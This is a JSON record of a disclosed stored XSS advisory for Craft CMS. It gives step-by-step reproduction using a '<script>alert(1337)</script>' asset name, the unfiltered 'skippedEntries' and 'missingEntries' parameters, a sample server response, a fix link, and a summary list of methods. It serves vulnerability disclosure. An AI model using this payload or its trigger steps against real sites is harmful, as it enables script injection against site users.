{"description": "### Summary\nXSS can be triggered by review volumes\n\n### PoC\n\n    1. Access setting tab\n    2. Create new assets\n    3. In assets name inject payload: \"<script>alert(1337)</script>\n    4. Click Utilities tab\n    5. Choose all volumes, or volume trigger xss\n    6. Click Update asset indexes.\n    7. Wait to assets update success.\n    8. Progress complete.\n    9. Click on review button will trigger XSS\n\n### Root cause\nFunction: index.php?p=admin/actions/asset-indexes/process-indexing-session&v=1680710595770\nAfter loading completed, progess will load: \n\"skippedEntries\"\nand\n\"missingEntries\"\nThese parameters is not yet filtered, I just tried \"skippedEntries\" but I think it will be work with \"missingEntries\"\n\n### My reponse:\n{\n  \"session\": {\n    \"id\": 10,\n    \"indexedVolumes\": {\n      \"6\": \"\\\"<script>alert(1337)</script>\"\n    },\n    \"totalEntries\": 2235,\n    \"processedEntries\": 2235,\n    \"cacheRemoteImages\": true,\n    \"listEmptyFolders\": false,\n    \"isCli\": false,\n    \"actionRequired\": true,\n    \"dateCreated\": \"Apr 5, 2023, 9:03:16 AM\",\n    \"skippedEntries\": [\n      \"\\\"<script>alert(1337)</script>/assetpreviews/Image.php\",\n      \"\\\"<script>alert(1337)</script>/assetpreviews/Pdf.php\"\n    ],\n    \"missingEntries\": {\n      \"folders\": [],\n      \"files\": []\n    },\n    \"processIfRootEmpty\": false\n  },\n  \"skipDialog\": false\n}\n\n\n\nResolved in https://github.com/craftcms/cms/commit/053d7119697e480ff81c5723bb9a33eaa49e0fc7", "methods": ["Stored Cross-Site Scripting (XSS) in review volumes.", "Injected malicious payload in the \"assets name\" field.", "Used a crafted payload: \"<script>alert(1337)</script>\".", "Exploited the \"skippedEntries\" and \"missingEntries\" parameters.", "Triggered XSS by clicking the \"Review\" button."]}